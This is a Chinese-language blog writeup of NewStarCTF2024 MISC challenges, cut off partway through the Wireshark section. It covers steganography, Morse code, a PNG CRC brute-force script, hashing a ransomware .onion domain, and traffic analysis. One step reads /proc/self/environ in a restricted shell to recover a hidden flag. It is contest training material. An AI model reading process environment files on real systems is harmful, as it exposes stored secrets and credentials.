<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>NewStarCTF2024 个人Writeup | GamerNoTitle</title><meta name="author" content="GamerNoTitle,admin@bili33.top"><meta name="copyright" content="GamerNoTitle"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="我电脑在第三周过一半的时候送去修了（CPU风扇不转了做个题都变成烤炉了），所以第四周是一点没动，第五周……搞不出来 所以本WP基本都是Week1~3的内容，4~5的建议去看官方WP   MISCWhereIsFlag 才。。。才不会告诉你我把flag藏在哪里了！ 【难度：简单】  不告诉我们就自己找呗，尝试用find &#x2F; -iname &quot;flag&quot;，但是说无法识别，同时在开始告">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF2024 个人Writeup">
<meta property="og:url" content="https://bili33.top/posts/NewStarCTF2024-Writeup/index.html">
<meta property="og:site_name" content="GamerNoTitle">
<meta property="og:description" content="我电脑在第三周过一半的时候送去修了（CPU风扇不转了做个题都变成烤炉了），所以第四周是一点没动，第五周……搞不出来 所以本WP基本都是Week1~3的内容，4~5的建议去看官方WP   MISCWhereIsFlag 才。。。才不会告诉你我把flag藏在哪里了！ 【难度：简单】  不告诉我们就自己找呗，尝试用find &#x2F; -iname &quot;flag&quot;，但是说无法识别，同时在开始告">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://assets.bili33.top/img/NewStarCTF2024-Writeup/NewCTF.png">
<meta property="article:published_time" content="2024-10-22T05:02:19.000Z">
<meta property="article:modified_time" content="2026-02-18T14:32:18.994Z">
<meta property="article:author" content="GamerNoTitle">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="NewStarCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://assets.bili33.top/img/NewStarCTF2024-Writeup/NewCTF.png"><link rel="shortcut icon" href="https://assets.bili33.top/img/AboutMe/logo-mini.png"><link rel="canonical" href="https://bili33.top/posts/NewStarCTF2024-Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1a9dfff1b560a523701cb01384373c75";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-138072700-2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-138072700-2');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;b259d35cad514e45a226d03906d8fed1&quot;}"></script><link rel="stylesheet" href="https://font.sec.miui.com/font/css?family=MiSans:400,500,700:Chinese_Simplify,Latin&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":180,"position":"top","messagePrev":"本文修改于","messageNext":"天前，如果本文有一定的时效性，那么本文可能已经失效~"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":200,"languages":{"author":"Author: GamerNoTitle","link":"Link: ","source":"Source: GamerNoTitle","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'NewStarCTF2024 个人Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2026-02-18 22:32:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3KdcwFGRWCpapHjZ",ck:"3KdcwFGRWCpapHjZ",autoTrack:true,hashMode:true,screenRecord:true})</script><meta name="referrer" content="no-referrer-when-downgrade" /><meta itemprop="name" content="GamerNoTitle"><meta itemprop="image" content="https://assets.bili33.top/img/AboutMe/logo-mini.png"><meta name="description" itemprop="description" content="欢迎来到GamerNoTitle的博客~"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-height.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/BB.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-emotion.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/Valine-Emotion.css"><script src="https://assets.bili33.top/js/IPblock.js"></script><script src='https://assets.bili33.top/js/console.js'></script><script src="https://cdn.bili33.top/npm/cardlink"></script><script src="//cdn.bili33.top/npm/matter-js@0.19.0"></script><script>(new Date().getDate() === 1 && new Date().getMonth() === 3) && document.write('<script src="https://cdn.bili33.top/gh/Vikutorika/newassets@master/js/smooth-April-Fools.js"><\/script>')</script><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="https://npm.elemecdn.com/echarts@4.9.0/map/js/china.js"></script><script defer src="https://analytics.bili33.top/script.js" data-website-id="eb23a18b-6650-4776-8ded-29107aba832b"></script><script src="/js/solidity.js"></script><link rel="stylesheet" href="/css/solidity.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="http://assets.bili33.top/css/waline-style.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="GamerNoTitle" type="application/atom+xml">
</head><body><link rel="stylesheet" href="https://cdn.bili33.top/npm/gamernotitle-oss@1.0.10/css/barber-shop.css"/><script src="https://cdn.bili33.top/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="onerror=null;src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://assets.bili33.top/img/NewStarCTF2024-Writeup/NewCTF.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">GamerNoTitle</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NewStarCTF2024 个人Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-22T05:02:19.000Z" title="Created 2024-10-22 13:02:19">2024-10-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-18T14:32:18.994Z" title="Updated 2026-02-18 22:32:18">2026-02-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">18.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>79min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NewStarCTF2024 个人Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>我电脑在第三周过一半的时候送去修了（CPU风扇不转了做个题都变成烤炉了），所以第四周是一点没动，第五周……搞不出来</p>
<p>所以本WP基本都是Week1~3的内容，4~5的建议去看官方WP</p>
</div>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="WhereIsFlag"><a href="#WhereIsFlag" class="headerlink" title="WhereIsFlag"></a>WhereIsFlag</h3><blockquote>
<p>才。。。才不会告诉你我把flag藏在哪里了！</p>
<p>【难度：简单】</p>
</blockquote>
<p>不告诉我们就自己找呗，尝试用<code>find / -iname &quot;flag&quot;</code>，但是说无法识别，同时在开始告诉我们了只能用<code>ls</code>、<code>cd</code>、<code>cat</code></p>
<p>寻找<code>/tmp</code>、<code>/home/teriri</code>、<code>/home/guest</code>均发现假的flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_Yt4Khx37j6.png"></p>
<p>然后把目标转向<code>proc</code>，可以从<code>/proc/self/environ</code>找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_Eumf1PsIpJ.png"></p>
<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><blockquote>
<p>听好了：9月23日，NewStar2024就此陷落。每抹陷落的色彩都将迎来一场漩涡，为题目带来全新的蜕变。</p>
<p>你所熟知的一切都将改变，你所熟悉的flag都将加诸隐写的历练。</p>
<p>至此，一锤定音。</p>
<p>尘埃，已然落定。</p>
<p><code>#newstar# #LSB# #听好了#</code></p>
<p>【难度：简单】</p>
</blockquote>
<p>这题已经告诉我们是LSB隐写了，直接拿脚本过来用，但是发现解压不出来有意义的东西</p>
<p>丢进StegSolve里面，逐个层看，发现在Red Plane 0有个二维码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/javaw_2MX6VlcBp4.png"></p>
<p>扫出来得到flag：<code>flag&#123;e33bb7a1-ac94-4d15-8ff7-fd8c88547b43&#125;</code></p>
<h3 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h3><blockquote>
<p>正在失传的技艺之压缩包解压</p>
<p>注：由于平台对flag的长度限制，请把解压的结果再计算32位小写md5后包上flag{}提交</p>
<p>【难度：签到】</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Bandizip.x64_DmJeYW2evy.png"></p>
<p>附件下载下来是分卷压缩文件，解压就行了，然后按照题目要求md5计算一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_XeqZjz9z7U.png"></p>
<h3 id="pleasingMusic"><a href="#pleasingMusic" class="headerlink" title="pleasingMusic"></a>pleasingMusic</h3><blockquote>
<p>一首歌可以好听到正反都好听(以flag{}形式提交，所有英文字母均为小写)</p>
<p>【难度：签到】</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/audacity_obQeHxaijR.png"></p>
<p>用Audacity打开可以看到很明显的摩斯电码特征，给弄出来，结果为<code>. ..- --- .-.- -.--.. . ... .-. --- -- -.--.. ..-- .</code>，翻译出来是<code>EUOESROME</code>，交上去不对</p>
<p>按照题目的意思，我们还可以反着来，反着来结果为<code>. --.. ..--.- -- --- .-. ... . ..--.- -.-. --- -.. .</code>，结果为<code>EZ_MORSE_CODE</code>，改成全小写并包裹flag，得到<code>flag&#123;ez_morse_code&#125;</code>，交上去就得分了</p>
<h3 id="兑换码"><a href="#兑换码" class="headerlink" title="兑换码"></a>兑换码</h3><blockquote>
<p>领取newstar前瞻兑换码，明天中午12点就失效喽！就在图片下面。什么，你没有看到？原来是png的下面啊，那没事了。</p>
<p>【难度：简单】</p>
</blockquote>
<div class="note info flat"><p>原神，启动！</p>
</div>

<p>一开始这个题目写在png的下面，想的是长宽修改，而且把文件用<code>pngcheck</code>一下发现CRC不对</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_8JBtvVOylB.png"></p>
<p>然后写个脚本去爆破宽高</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标CRC值</span></span><br><span class="line">target_crc = <span class="number">0x1C204ACF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IHDR块中除去宽度和高度之外的部分</span></span><br><span class="line"><span class="comment"># 假设 IHDR 中其它字段固定为这些值（颜色类型：RGB+alpha，8位深度，无压缩，无过滤）</span></span><br><span class="line">ihdr_fixed_data = <span class="built_in">bytes</span>([<span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成完整的 IHDR 数据并计算 CRC</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_crc</span>(<span class="params">width, height</span>):</span><br><span class="line">    <span class="comment"># 将宽度和高度转换为 4 字节（大端序）</span></span><br><span class="line">    ihdr_data = width.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + height.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + ihdr_fixed_data</span><br><span class="line">    <span class="comment"># 计算包含 &quot;IHDR&quot; 的 CRC 校验值</span></span><br><span class="line">    <span class="keyword">return</span> zlib.crc32(<span class="string">b&#x27;IHDR&#x27;</span> + ihdr_data) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破宽度和高度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_crc</span>():</span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>):  <span class="comment"># 设置宽度的范围</span></span><br><span class="line">        <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>):  <span class="comment"># 设置高度的范围</span></span><br><span class="line">            crc = calculate_crc(width, height)</span><br><span class="line">            <span class="keyword">if</span> crc == target_crc:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;找到匹配的宽度和高度: 宽度=<span class="subst">&#123;width&#125;</span>, 高度=<span class="subst">&#123;height&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> width, height</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始爆破</span></span><br><span class="line">brute_force_crc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑出来结果是<code>2560*1267</code>，换成十六进制是<code>0xA00 * 0x4E9</code>，去010Editor里面改一下图片的宽高（图示黄色的那个<code>E9</code>）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/010Editor_9vmQAtIR7q.png"></p>
<p>就可以得到flag了，为<code>flag&#123;La_vaguelette&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/code-with-flag.png"></p>
<h3 id="用溯流仪见证伏特台风"><a href="#用溯流仪见证伏特台风" class="headerlink" title="用溯流仪见证伏特台风"></a>用溯流仪见证伏特台风</h3><blockquote>
<p>漂亮国也干了。照着2024年7月8日央视新闻的方法来看看隐匿在图片下的东西吧.</p>
<p>新闻视频: <a href="https://b23.tv/BV1Ny411i7eM">https://b23.tv/BV1Ny411i7eM</a></p>
<p>新闻中提到的威胁盟报告里，隐藏在图片下，Domain下方那个框里所有字符的16位小写md5，包裹 flag{} 即为 flag.</p>
<p>提示:这个视频就是WP；运气不好的话，你也许需要使用溯流仪（网站时光机）。</p>
<p>PS:如果你眼力好，肉眼能从视频读出来，也是你的水平。祝你玩得开心。</p>
<p>【难度：简单】</p>
</blockquote>
<p>好吧，我拼眼力不行，我还不会用wayback machine嘛</p>
<p>在Google上搜书名，得到官方下载链接：<a href="https://threatmon.io/storage/the-rise-of-dark-power-a-close-look-at-the-group-and-their-ransomware.pdf">https://threatmon.io/storage/the-rise-of-dark-power-a-close-look-at-the-group-and-their-ransomware.pdf</a></p>
<p>然后去wayback machine，直接一搜，视频里说4月15更改的，最早的也只有这个版本，所以直接下载下来</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_CghcvRRvgl.png"></p>
<p>下载下来以后，跟着视频里面一样移除封底就有了，得到<code>Domain</code>为<code>powerj7kmpzkdhjg4szvcxxgktgk36ezpjxvtosylrpey7svpmrjyuyd.onion</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Acrobat_bZ5St8EZqW.png"></p>
<p>然后根据题目要求，计算一下16位的md5</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;powerj7kmpzkdhjg4szvcxxgktgk36ezpjxvtosylrpey7svpmrjyuyd.onion&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 MD5 哈希值</span></span><br><span class="line">md5_hash = hashlib.md5(input_string.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取前16位</span></span><br><span class="line">md5_16 = md5_hash[:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(md5_16)</span><br></pre></td></tr></table></figure>

<p>最终得到结果为<code>8519ca216c3ea51b</code>，所以flag为<code>flag&#123;8519ca216c3ea51b&#125;</code></p>
<div class="note info flat"><p>附上此版本的PDF：<a href="https://assets.bili33.top/files/NewStarCTF2024/the-rise-of-dark-power-a-close-look-at-the-group-and-their-ransomware-20240415.pdf">https://assets.bili33.top/files/NewStarCTF2024/the-rise-of-dark-power-a-close-look-at-the-group-and-their-ransomware-20240415.pdf</a></p>
</div>

<h3 id="wireshark-checkin"><a href="#wireshark-checkin" class="headerlink" title="wireshark_checkin"></a>wireshark_checkin</h3><blockquote>
<p>un搭建了一个简单的http服务器，但是不小心把重要文件删除了，只剩下访问这些文件时的流量，你能帮他找到吗</p>
<p>【难度：签到】</p>
</blockquote>
<div class="note info flat"><p>@unknown (doge)</p>
</div>

<p>下载下来是wireshark的流量包，先筛选http流量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Wireshark_v7eUE5e3Bs.png"></p>
<p>然后看到个很明显的<code>/flag.txt</code>，右键追踪HTTP流，可以得到flag为<code>flag&#123;ez_traffic_analyze_isn&#39;t_it&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Wireshark_yOaywEOP4G.png"></p>
<h3 id="wireshark-secret"><a href="#wireshark-secret" class="headerlink" title="wireshark_secret"></a>wireshark_secret</h3><blockquote>
<p>un偷看涩图，被抓到流量了</p>
<p>【难度：简单】</p>
</blockquote>
<div class="note info flat"><p>还是@unknown (doge)</p>
</div>

<p>过滤http流量，发现<code>secret.png</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Wireshark_p8VLB10xSl.png"></p>
<p>右键追踪http流，选择返回的数据，然后显示方式选择原始数据，另存为我们的会话</p>
